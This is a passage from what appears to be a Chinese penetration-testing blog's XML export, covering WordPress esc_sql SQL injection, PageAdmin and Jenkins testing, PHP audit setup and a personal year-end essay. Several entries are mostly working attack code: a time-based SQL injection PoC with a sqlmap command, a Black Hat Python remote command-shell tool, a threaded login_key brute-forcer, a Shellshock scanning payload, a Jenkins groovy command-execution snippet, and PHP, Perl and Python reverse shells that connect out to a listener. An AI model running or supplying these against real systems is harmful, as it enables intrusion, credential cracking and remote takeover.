hacking》、《XML实体攻击-从内网探测到命令执行步步惊心》0x05 上传漏洞&nbsp; &nbsp; 这两个都是危害非常大的漏洞：&nbsp; &nbsp; 上传漏洞，ws是可以上传附件的，典型的例子就是trs上传漏洞http://www.wooyun.org/bugs/wooyun-2010-0921380x06 总结：&nbsp; &nbsp; 从上面的攻击方式不难看出分为两类：1.xml相关攻击技术；2.使用soap请求传输数据，数据进去其他程序引起的漏洞（sql注入），因此漏洞利用形式多种多样，不同场景会有不同利用方式结合使用或者是bypass，掌握基础的知识才能在遇到的时候灵活运用。0x07 引用： 来自为知笔记(Wiz) ### 附件列表* XML安全之Web Services.zip &nbsp;]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[esc_sql Doh! WordPress SQL Injection Vulnerability]]></title>
    <url>%2F2015%2F03%2F18%2Fesc-sql-doh-wordpress-sql-injection-vulnerability%2F</url>
    <content type="text"><![CDATA[分析WordPress中esc_sql函数引起的注入危害引言：&nbsp; &nbsp; 这篇文章说的不是esc_sql函数自身有什么逻辑上缺陷或者不足，而是说下关于二次开发者错误的使用此函数引起的注入漏洞。esc_sql函数介绍&nbsp; &nbsp; 在wordpress手册中关于esc_sql的解释，在以前的版本中，官方并没有说出这个函数有任何问题：&nbsp; &nbsp; 在近期的wordpress手册中说出了这个函数如果错误使用会造成注入漏洞：&nbsp; &nbsp; 我们再看下esc_sql的实现：&nbsp; &nbsp;&nbsp;function esc_sql( $data ) { global $wpdb; return $wpdb-&gt;_escape( $data );&nbsp; &nbsp;&nbsp;}&nbsp; &nbsp;&nbsp;function _escape( $data ) { if ( is_array( $data ) ) { foreach ( $data as $k =&gt; $v ) { if ( is_array($v) ) $data[$k] = $this-&gt;_escape( $v ); else $data[$k] = $this-&gt;_real_escape( $v ); } } else { $data = $this-&gt;_real_escape( $data ); } return $data;&nbsp; }&nbsp; &nbsp;&nbsp;function _real_escape( $string ) { if ( $this-&gt;dbh ) { if ( $this-&gt;use_mysqli ) { return mysqli_real_escape_string( $this-&gt;dbh, $string ); } else { return mysql_real_escape_string( $string, $this-&gt;dbh ); } } $class = get_class( $this ); if ( function_exists( ‘‘ ) ) { _doing_it_wrong( $class, sprintf( ( ‘%s must set a database connection for use with escaping.’ ), $class ), E_USER_NOTICE ); } else { _doing_it_wrong( $class, sprintf( ‘%s must set a database connection for use with escaping.’, $class ), E_USER_NOTICE ); } return addslashes( $string ); }&nbsp; &nbsp;&nbsp;通过对比上面两个手册和代码我们可以清晰的得出以下几个结论：&nbsp; &nbsp;&nbsp;&nbsp;&nbsp; &nbsp; 1.99%的情况下你可以使用$wpdb-&gt;prepare()函数来做数据库操作（有那些是哪不能的1%呢？order by、like···· ）&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;2.esc_sql是addslashes()函数的数组应用，但是esc_sql转义数组的时候只转义数组值。&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;3.esc_sql并没有对输入数据自动加引号保护&nbsp; &nbsp; 由于老版本手册的说明不严谨问题，在很多二次开发者使用esc_sql函数的时候出现了注入漏洞。wp-seo插件注入漏洞&nbsp; &nbsp; 在文件admin/class-bulk-editor-list-table.php中： protected function parse_item_query( $subquery, $all_states, $post_type_clause ) { // Order By block $orderby = ! empty( $_GET[‘orderby’] ) ? esc_sql( sanitize_text_field( $_GET[‘orderby’] ) ) : ‘post_title’; $order &nbsp; = ‘ASC’; if ( ! empty( $_GET[‘order’] ) ) { $order = esc_sql( strtoupper( sanitize_text_field( $_GET[‘order’] ) ) ); } // Get all needed results $query = “ SELECT ID, post_title, post_type, post_status, post_modified, post_date FROM {$subquery} WHERE post_status IN ({$all_states}) $post_type_clause ORDER BY {$orderby} {$order} LIMIT %d,%d “; return $query; }&nbsp; &nbsp;&nbsp; &nbsp; 其中很明显的漏洞出现了，然后就是构造poc：&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;http://192.168.9.102/wordpress/wp-admin/admin.php?page=wpseo_bulk-editor&amp;type=title&amp;orderby=post_date%2c(select%20&amp;#42%20from%20(select(sleep(10)))a)&amp;order=asc))a)&amp;order=asc) &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; 如何使用sqlmap在order by后面延时注入，可以请参考：http://drops.wooyun.org/tips/5254自写，&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; 也可以抓包：&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;python sqlmap.py -r 2.txt –technique=T –level=3 –dbms=MySQL -D wordpress –tablesGET /wordpress/wp-admin/admin.php?page=wpseo_bulk-editor&amp;type=title&amp;orderby=pos$Host: 192.168.9.102Proxy-Connection: keep-aliveCache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,&amp;#42/&#42;q=$User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like$Accept-Encoding: gzip, deflate, sdchAccept-Language: zh-CN,zh;q=0.8Cookie: wordpress_1d5e8f89471a6349f1caf2e6b8aa4232=admin%7C1426827482%7CjKzM166$… &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; 出现这样漏洞的插件还有：&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;WooCommerce 2.3 – 2.3.5&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;Pods 1.10 &lt;= 2.5.1.1&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;AffiliateWP &lt; 1.5.7&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;WP All Import &lt; 4.1.2&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;Gravity Forms &lt; 1.9.4总结：&nbsp; &nbsp; 从上面的分析和出现的已知漏洞不难看出，此函数滥用的插件应该不在少数。参考：http://www.pritect.net/blog/esc_sql-doh-wordpress-sql-injection-vulnerabilityhttp://www.reddit.com/r/netsec/comments/2zcy22/esc_sql_doh_wordpress_sql_injection_vulnerability/https://wpvulndb.com/vulnerabilities/7841&nbsp;&nbsp; &nbsp;&nbsp; 来自为知笔记(Wiz)]]></content>
      <categories>
        <category>0day漏洞</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[读Black Hat Python 笔记]]></title>
    <url>%2F2015%2F01%2F13%2F%E8%AF%BBBlack-Hat-Python-%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[import sys import socket import getopt import threading import subprocess # define some global variables listen =False command =False upload =False execute ="" target ="" upload_destination = "" port =0 def usage(): print "BHP Net Tool" print print "Usage: bhpnet.py -t target_host -p port" print "-l --listen - listen on [host]:[port] for incoming connections" print "-e --execute=file_to_run - execute the given file upon receiving a connection" print "-c --command - initialize a command shell" print "-u --upload=destination - ipon receiving connection upload a file and write to [destination]" print print print "Examples: " print "bhpnet.py -t 192.168.0.1 -p 6666 -l -c" print "bhpnet.py -t 192.168.0.1 -p 6666 -l -u=c:\target.exe" print "bhpnet.py -t 192.168.0.1 -p 6666 -l -e="cat /etc/passwd"" print "echo ’ABCDEFGHI’ | ./bhpnet.py -t 192.168.11.12 -p 35" sys.exit(0) def main(): global listen global port global execute global command global upload_destination global target if not len(sys.argv[1:]): usage() # read the commandline options try: opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu",["help","listen","execute","target","port","command","upload"]) except getopt.GetoptError as err: print str(err) usage() for o,a in opts: if o in ("-h","--help"): usage() elif o in ("-l","--listen"): listen =True elif o in ("-e", "--execute"): execute = a elif o in ("-c", "--commandshell"): command = True elif o in ("-u","--upload"): upload_destination = a elif o in ("-t", "--target"): target = a elif o in ("-p", "--port"): port = int(a) else: assert False,"Unhandled Option" #are we going to listen or just send data from stid? if not listen and len(target) and port &gt; 0: #read in the buffer from the commandline #this will block, so send CTRL-D if not sending input to stdin buffer = sys.stdin.read() #read data off client_sender(buffer) # we are going to listen and potentially upload things, execute commands, # and drop a shell back depending on our command line options above if listen: server_loop() def client_sender(buffer): client = socket.socket(socket.AF_INET,socket.SOCK_STREAM) try: #connect to our target host client.connect((target, port)) if len(buffer): client.send(buffer) while True: # now wait for data back recv_len = 1 response = "" while recv_len: data = client.recv(4096) recv_len = len(data) response+= data if recv_len &lt; 4096: break print response, #wait for more input buffer = raw_input("") buffer += " " # send it off client.send(buffer) except: print "[&#42] Exception! Exiting." # tear down the connection client.close() def server_loop(): global target # if no target is defined, we listen on all interfaces if not len(target): target = "0.0.0.0" server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server.bind((target, port)) server.listen(5) while True: client_socket, addr = server.accept() #spin off a thread to handle our new client client_thread = threading.Thread(target=client_handler, args=(client_socket,)) client_thread.start() def run_command(command): # trim the newline command = command.rstrip() #run the command and get the out back try: output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True) except: output = "Failed to execute command. " #send the output back to the client return output def client_handler(client_socket): global upload global execute global commnad #check for upload if len(upload_destination): #read in all of the bytes and write to our destination file_buffer = "" #kepp reading data until none is available while True: data = client_socket.recv(1024) if not data: break else: file_buffer += data #now we take these bytes and try to them out try: file_descriptor = open(upload_destination, "wb") file_descriptor.write(file_buffer) file_descriptor.close() #acknowledge that we wrote the file out client_socket.send("Successfully saved file to %s " % upload_destination) except: client_socket.send("Fail to save file to %s " %upload_destination) #check for command execution if len(execute): #run the command output = run_command(execute) client_socket.send(output) # now we go into another loop if a command shell was requested if command: while True: client_socket.send("&lt;BHP:#&gt; ") cmd_buffer = "" while " " not in cmd_buffer: cmd_buffer += client_socket.recv(1024) # send back the command output response = run_command(cmd_buffer) #send back the response client_socket.send(response) if __name__ == "__main__": main()]]></content>
      <categories>
        <category>Python|C|C++</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2014年，是这样的一年]]></title>
    <url>%2F2015%2F01%2F01%2F2014%E5%B9%B4%EF%BC%8C%E6%98%AF%E8%BF%99%E6%A0%B7%E7%9A%84%E4%B8%80%E5%B9%B4%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; 看了前几年的总结，或许心态发生的了很大的变化，现在记不清了为什么没有2013年的总结，或许当时我已经懒的忘记总结了。 2014年人生发生了很多意想不到却又情理之中的事情。一切有开始必就有结束，有些过程是人生必然会经历的，体验感受也是一种财富，或者这样的体验感受会让你纠结、痛苦、无奈、自责、失望??????但谁的人生不是这样呢？ &nbsp; &nbsp; 2014年，爷爷去世的一年。生命的诞生与结束，似是匆匆来匆匆去。第一次这样近距离的面对亲人的离世，让我久久难以释怀。脑海里那些挥之不去的画面，总能让我双眼湿润，思考生命的意义。我不知道我思考的答案是什么，我只能循着模糊的感觉蹒跚而行。 &nbsp; &nbsp; 2014年，半只脚踏出学校的一年。“实习”和“苦力”，我收获了什么我付出了什么，价值是否可估，我不知道，我也不想苦苦寻觅，生命中总有那么些未知的谜底，可能它会在你接下来的人生中逐一解开，但也可能它永久的就那么消逝在了时间长河之中，最后久而久之让你都忘记了当初的谜题在哪儿。有些事情就让我们在糊涂中度过吧，说不定此时的糊涂会在不久的将来给你一个你意想不到的收获，糊涂一次换一次惊喜，还是一笔不错的买卖。 &nbsp; &nbsp; 2014年，“你该找个女朋友了”。这八个字出现在了不同人口中，有同学、朋友、亲人、同事??????有些事情就成为记忆吧，还算美好的记忆。 &nbsp; &nbsp; 2014年，又出现了一个关系人生的选择。工作。我想的是什么？我要的是什么？我追求的是什么？我能这样做么？我可以这样做么？我应该这样做么？一个又一个只能自己回答的问题出现在脑海之中。弄的都有些像禅宗的“开悟”了。我不知道我悟了没有，我也不知道我的选择是对是错，或许选择根本没有对错，它的目的只是让人抉择，让人不由自主的思考，不由自主的一遍又一遍的问自己一些自己都不知道答案的问题，在这一遍又一遍的自问之中，静下心来突然有那么一点灵光，或许就是悟了。我不知道我脑海里曾经是否出现过灵光，我也不知道我所体会的悟了是不是真的悟了，就这样在只可意会不可言传之中我选择了360，放弃了我觉得我会选择的阿里，别问为什么，我不知道，硬要问，回答你的都是敷衍之词。 &nbsp; &nbsp; 2014年还是有很多没有改变的东西，我还是个穷光蛋，我还是没有女朋友，我还是不够努力，我还是没有实现吹过的牛逼，有这样的一段话，“一年又将过去了，我2015年的目标是搞定2014年那些原定于2013年完成的安排，不为别的，只为兑现我2012年时要完成的2011年年度计划的诺言和2010年吹过的牛逼”。2010年我高中毕业踏入了大学的校门，吹过很多自己要怎么怎么地的牛逼，兄弟们还记得当年我们一起吹过的牛逼么？ &nbsp; &nbsp; 2015年，目标已经在上面说过了，希望2015年的总结不会同上。在此祝愿爱我的和我爱的人们，红尘作伴活得潇潇洒洒。]]></content>
      <categories>
        <category>琐碎杂事</category>
      </categories>
      <tags>
        <tag>2014</tag>
        <tag>2015</tag>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[php-vuls-handbook]1.1测试环境的搭建]]></title>
    <url>%2F2014%2F12%2F28%2Fphp-vuls-handbook-1-1%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[0x01 前言 &nbsp; &nbsp;&nbsp;习惯性的懒，这个两年前的事拖到现在，唉！虽然给自己找了万般理由，最后归结一个字还是懒，话不多说，开写。在做php代码审计之前必然需要搭建一个php运行环境。可能你会说：“这个有什么讲的，一个集成环境直接一键搭建不就行了”。这的确是一个方法，但你要知道一个漏洞的形成有很多因素，可能其中就有环境因素。 &nbsp; &nbsp; php测试环境基本由四部分组成：系统、php、web容器、数据库，系统常用的是windows/linux，web容器常用iis和apache，数据库常用mysql。 0x02 PHP-IIS-MYSQL&nbsp; &nbsp; 当然IIS一般是配合windows系统,你非要说我可以搭建在linux上,我也只能说fuck自己玩蛋去。当然我这说的wpim环境，不是集成环境，当然集成环境也是有的可以一键搭建，但是有个缺点是不能搭建特定环境，比如指定php版本，iis版本，mysql版本。&nbsp; &nbsp; 由于我比较懒，其次是网上搭建方法一大堆，你懂的我就不搭建了，哈哈！&nbsp;&nbsp;0x03&nbsp;PHP-APACHE-MYSQL &nbsp; &nbsp;&nbsp;PHP-APACHE-MYSQL测试环境可能出现在windows和linux上了，有时候漏洞的形成和系统的一些特性有很大的关联，比如：windows短文件名可能造成数据库备份文件下载。 &nbsp; &nbsp; 环境的搭建当然涉及到不同系统，虚拟机是必备的，如果你要说你有钱你任性，你买个服务器，装个虚拟化也是可以的（ps:有人这么干）。至于具体搭建方法，网上一大堆（不要吐槽“网上一大堆”这句话，如果在这么丰富的资源下你还不能自己搭建好一个环境，说明你缺乏自学能力，那就不要学代码审计了，你是不可能有学会的，最多也就学个照葫芦画瓢）。 0x04&nbsp;php集成环境&nbsp; &nbsp; 如果你说你懒，还是集成环境吧，特殊的时候再去搭建特殊环境。有几个集成环境还是不错的：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;phpstudy多环境切换还是不错；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; phpnow也可以&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; wamp也行&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; xampp这个配合php动态调试还不错&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; 其他的还有很多了，百度一下一大堆。0x05 php.ini、.htaccess、.user.ini &nbsp; &nbsp; 这3个文件是比较重要的文件了。php.ini如果你搭建了php环境你就知道它的重要性了，它是php的配置文件，在我们代码审计的时候，需要开始和关闭一些php功能，都需要修改它。 &nbsp; &nbsp; .htaccess是apache的一个配置文件，用来对相关目录下的网页做配置。 &nbsp; &nbsp; .user.ini是php的配置文件，但是是php5.3以后的东西还必须是CGI/FastCGI SAPI，这个以前被谈的少，是因为大家php环境大多还停留在5.2，现在被大家提起是因为环境升级，越来越多的生产环境用php5.3了，php5.3是一个比较大的临界点，5.3以前和5.3以后php多了很多特性，.user.ini是其中一个，它具体有什么用呢，这个可以百度，我们关注他的应该是“相关目录”这四个字，.htaccess也是有这四个字，“相关目录”说明可以出现在web目录下，能够出现在web目录下，而且对环境还有控制作用，这就是我们关注它的原因。比如asp.net中的web.config文件，很多服务器权限设置不严格，让我们可以访问到，这就要出事了。 0x06 结束语 &nbsp; &nbsp; 完了，大牛看完然后吐槽：“写的什么啊，完全是地摊货嘛，没亮点”，必须承认没什么东西，能力有限，php-vuls-handbook是写php相关代码审计入门知识，什么进阶篇，高阶篇，表示还没那个胆量装逼，现在也就写写入门装装逼，装的不好的望指正，我一定改正，装的更真实一些。]]></content>
      <categories>
        <category>php-vuls-handbook</category>
      </categories>
      <tags>
        <tag>ebook</tag>
        <tag>php代码审计</tag>
        <tag>入门教程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[黑吃黑的webshell后门]]></title>
    <url>%2F2014%2F12%2F26%2F%E9%BB%91%E5%90%83%E9%BB%91%E7%9A%84webshell%E5%90%8E%E9%97%A8%2F</url>
    <content type="text"><![CDATA[看见一个国外文档分析，国外的各种webshell里面的后门，黑吃黑，国内也不少。 &nbsp; http://h4x0resec.blogspot.tw/2014/12/online-shell-services-backdoor.html]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>backdoor</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一个关于监控摄像头的文档]]></title>
    <url>%2F2014%2F12%2F25%2F%E4%B8%80%E4%B8%AA%E5%85%B3%E4%BA%8E%E7%9B%91%E6%8E%A7%E6%91%84%E5%83%8F%E5%A4%B4%E7%9A%84%E6%96%87%E6%A1%A3%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; mickey牛发我一个文档学习，是个2013年就发出来的文档，关于监控摄像头的文档，里面介绍了几种利用方法，做个笔记，记录下。 &nbsp;http://note.youdao.com/share/?id=5fce3c6f1cdf0b863defb5ef7dbdaa4f&amp;type=note &nbsp; 原始文档：见附件 &nbsp;]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>监控摄像</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SiteServer CMS 密码加解密小工具]]></title>
    <url>%2F2014%2F11%2F28%2FSiteServer-CMS-%E5%AF%86%E7%A0%81%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%B0%8F%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[siteserver cms 自带的加解密函数,可逆的。 写个小工具方便操作]]></content>
      <categories>
        <category>Python|C|C++</category>
      </categories>
      <tags>
        <tag>siteServer</tag>
        <tag>加解密</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PageAdmin相关的工具]]></title>
    <url>%2F2014%2F11%2F23%2FPageAdmin%E7%9B%B8%E5%85%B3%E7%9A%84%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; 这几天看PageAdmin这套程序，然后写了几个小工具，代码很简单，于是乎共享给大家，可能有朋友也会用到，恢复写博客，记录下我所干过的事，回到初衷。 1.login_key 生成validate（ps:程序中是calicate，不知道是不是程序员写错了），calidate是和程序权限验证相关的东西。 2.是关于发给提交给wooyun，关于login_key的爆破的漏洞的，爆破程序就不发了，记录下多线程爆破的一个模板。 #!/usr/bin/env python #coding=utf-8 #PageAdmin login_key crack exploit #author: K1p4ss@insight-labs.org #blog: http://lanu.sinaapp.com #date: 2014/11/21 import os import re import sys import gzip import time import Queue import getch import urllib import httplib import StringIO import datetime import threading print ’’’ ####################################################### # # # xxxxxxxxxxxxxxxxxxx crack exploit # # author: K1p4ss@insight-labs.org # # blog: http://lanu.sinaapp.com # # date: 2014/11/21 # # # ####################################################### ’’’ class LoginKeyCrack(threading.Thread): def __init__(self): threading.Thread.__init__(self) self.conn = httplib.HTTPConnection(ztarget) def run(self): while 1: if queue.empty()== True: self.conn.close() break self.Crack() def Crack(self): global count,AvailableLoginKey self.loginkey = str(queue.get()) count = count + 1 #print "----&gt;"+str(count)+"|"+self.loginkey if((count%1000) == 0): print " [--K1p4ss--]&gt;"+str(count) self.params = {’value’:self.loginkey} //post date self.params = urllib.urlencode(self.params) try: self.conn.request(method="POST",url=target,body=self.params,headers=headers) self.response = self.conn.getresponse() if (’content-encoding’, ’gzip’) in self.response.getheaders(): self.compressedstream = StringIO.StringIO(self.response.read()) self.gzipper = self.gzip.GzipFile(fileobj=self.compressedstream) self.data = self.gzipper.read() else: self.data = self.response.read() if(self.data.find("1") &gt;= 0): print " [-LoginKey-]&gt;"+self.loginkey AvailableLoginKey.append(self.loginkey) try: while 1: print "Y or N to continue,please press [y/n]" chr = getch.getch() if chr == ’n’: for i in AvailableLoginKey: print " [-Available-]&gt; "+str(i) os._exit(1) if chr == ’y’: break except: os._exit(1) except Exception,e: print e pass def CreateLoginKey(LoginKeyStartTime,Days): DS = datetime.datetime(int(LoginKeyStartTime[0:4]),int(LoginKeyStartTime[4:6]),int(LoginKeyStartTime[6:8])) LKFile = open(’./login_key’,’a’) for i in range(Days&#4286400): DT = DS + datetime.timedelta(seconds = i) OutStr = DT.strftime("%Y%m%d%H%M%S") LKFile.write(OutStr+’ ’) LKFile.close() if __name__ == "__main__": if len(sys.argv) != 5: print ’[-]usage: [-] python ’+sys.argv[0]+’ http://lanu.sinaapp.com 10 20141121 1 ’ exit(0) threads = [] AvailableLoginKey = [] target = sys.argv[1] ThreadNum = int(sys.argv[2]) LoginKeyStartTime = sys.argv[3] Days = int(sys.argv[4]) count = 0 print ’ [----OK----]&gt;Creating loginkey...’ if(os.path.exists(’./login_key’)): os.remove(’./login_key’) CreateLoginKey(LoginKeyStartTime,Days) loginkey = ’./login_key’ fp = open(loginkey) queue = Queue.Queue() for Lkey in fp.readlines(): queue.put(Lkey.split(’ ’)[0]) fp.close() pattern = re.compile(’http:&#42’) match = pattern.search(target) if(match): print " [----OK----]&gt;Starting..." ztarget = target.replace("http://","").split(’/’)[0] headers={"Host": ztarget, "User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded", "Referer": "http://"+ztarget } else: print " [--ERROR--]-&gt;Please Enter : http://www.xxx.com/" os._exit(1) try: for i in range(ThreadNum): #print i a = LoginKeyCrack() a.start() threads.append(a) for j in threads: j.join() print j except Exception,e: print e]]></content>
      <categories>
        <category>Python|C|C++</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[摘录GoogleSpider代码段]]></title>
    <url>%2F2014%2F09%2F26%2F%E6%91%98%E5%BD%95GoogleSpider%E4%BB%A3%E7%A0%81%E6%AE%B5%2F</url>
    <content type="text"><![CDATA[看见一段不错的google spider 的python代码段，记录下来用的时候直接复制粘贴：author:Netxfly # -&#42- coding : utf8 -&#42- import json import time import datetime import requests class GoogleSpider(object): def __init__(self, p): self.p = p self.url = ’https://ajax.googleapis.com/ajax/services/search/web’ self.keyword = r’filetype:sh inurl:cgi-bin’ self.session = requests.Session() url = ’%s?v=1.0&amp;q=%s&amp;rsz=8&amp;start=0’ % (self.url, self.keyword) r = self.session.get(url, verify=True) self.result = json.loads(r.text) def get_result(self): self.pages = self.result.get(’responseData’).get(’cursor’).get(’pages’) results = [] if self.pages: for page in self.pages: url = ’%s?v=1.0&amp;q=%s&amp;rsz=8&amp;start=%s’ % (self.url, self.keyword, page.get(’start’)) r = self.session.get(url, verify=True) result = json.loads(r.text) results.extend(result.get(’responseData’).get(’results’)) time.sleep(3) if page.get(’start’) &gt; self.p: break self.results = dict( time = datetime.datetime.now(), p = self.p, data = results ) return self.results class Scan(object): def __init__(self, url): self.url = url self.session = requests.Session() def Send(self): payload = { r’() { 1;}; echo -e "headerx3ashellshock-scan1"’ : ’() { 1;}; echo -e "headerx3ashellshock-scan2"’ } r = self.session.get(self.url, headers = payload) if r.headers[’header’] == ’shellshock-scan2’: print "%s has vulnerable" % url else: print "%s no vulnerable" % url if __name__ == ’__main__’: spider = GoogleSpider(10) # google page size : 200 results = spider.get_result() for item in results.get(’data’): url = item.get(’url’) try: print "[&#42] Checking : %s" % url #scan = Scan(url) #scan.Send() except Exception, e: pass else: pass # try: # url = ’http://manticore.2y.net/cgi-bin/dlwct.sh’ # print "[&#42] Checking : %s" % url # scan = Scan(url) # scan.Send() # except Exception, e: # pass # else: # pass]]></content>
      <categories>
        <category>Python|C|C++</category>
      </categories>
      <tags>
        <tag>url spider</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记录一些反弹shell代码]]></title>
    <url>%2F2014%2F09%2F26%2F%E8%AE%B0%E5%BD%95%E4%B8%80%E4%BA%9B%E5%8F%8D%E5%BC%B9shell%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[php: $protocol=getprotobyname(’tcp’); $Sock=socket_create(AF_INET,SOCK_STREAM,$protocol); $ret=socket_connect($Sock,gethostbyname(’127.0.0.1’),’11011’); $message="------PhpShell hacked by mickey--------- mickey@pentest:"; socket_write($Sock,$message,strlen($message)); while($cmd=socket_read($Sock,65535,$protocol)){ if(trim(strtolower($cmd))=="exit"){ socket_write($Sock,"Bye Bye,hacked by mickey "); exit; }else{ $process = proc_open($cmd, array(0=&gt;array("pipe","r"),1=&gt;array("pipe","w"),2=&gt;array("pipe","w"),),$pipes,str_replace(’\’,’/’,dirname(__FILE__)),array(’PATH’=&gt;’/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin’)); if(is_resource($process)){ fwrite($pipes[0], $cmd); fclose($pipes[0]); $msg=stream_get_contents($pipes[1]); socket_write($Sock,$msg,strlen($msg)); fclose($pipes[1]); $msg=stream_get_contents($pipes[2]); socket_write($Sock,$msg,strlen($msg)); $return_value = proc_close($process); } socket_write($Sock,’mickey@pentest:’,strlen(’mickey@pentest:’)); } } &nbsp; perl: use strict; use Socket; use IO::Handle; my $pack_addr = sockaddr_in(8080, inet_aton("127.0.0.1")); socket(S,AF_INET,SOCK_STREAM,0); STDOUT-&gt;autoflush(1); S-&gt;autoflush(1); connect(S,$pack_addr); open STDIN, "&lt;&amp;S"; open STDOUT, "&gt;&amp;S"; open STDERR, "&gt;&amp;S"; system("/bin/sh -i"); close S; exit 0; &nbsp; python: import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.0.0.1",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>shell</tag>
        <tag>反弹</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于Jenkins安全测试的一些技巧]]></title>
    <url>%2F2014%2F08%2F21%2F%E5%85%B3%E4%BA%8EJenkins%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; 今天mickey牛发来一篇关于hacking Jenkins的文章，受益匪浅，虽然不是很高深的东西，看完几篇相关文章之后记录下要点，为以后做安全测试留下笔记。 &nbsp; &nbsp; 文章链接： &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http://www.labofapenetrationtester.com/2014/08/script-execution-and-privilege-esc-jenkins.html &nbsp; &nbsp; &nbsp; &nbsp; http://www.labofapenetrationtester.com/2014/06/hacking-jenkins-servers.html &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://www.pentestgeek.com/2014/06/13/hacking-jenkins-servers-with-no-password/ &nbsp; &nbsp; 工具链接： &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://wiki.jenkins-ci.org/display/JENKINS/Terminal+Plugin &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://github.com/samratashok/nishang &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://wiki.skullsecurity.org/Passwords &nbsp; &nbsp; 文章要点： &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; 看了几篇文章说道了一下几个东西： &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; 1.通过自带的groovy script的解析器可以执行命令 12345def sout = new StringBuffer(), serr = new StringBuffer()def proc = ’[INSERT COMMAND]’.execute()proc.consumeProcessOutput(sout, serr)proc.waitForOrKill(1000)println “out&gt; $sout err&gt; $serr” &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; 2.使用强大的powershell脚本，nishang是一个powershell脚本集 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; 3.当我们没有办法进入console script界面执行脚本的时候可以采用以下方法 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; a.Jenkins的一下目录泄漏了一写开发用户信息 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;List of users: 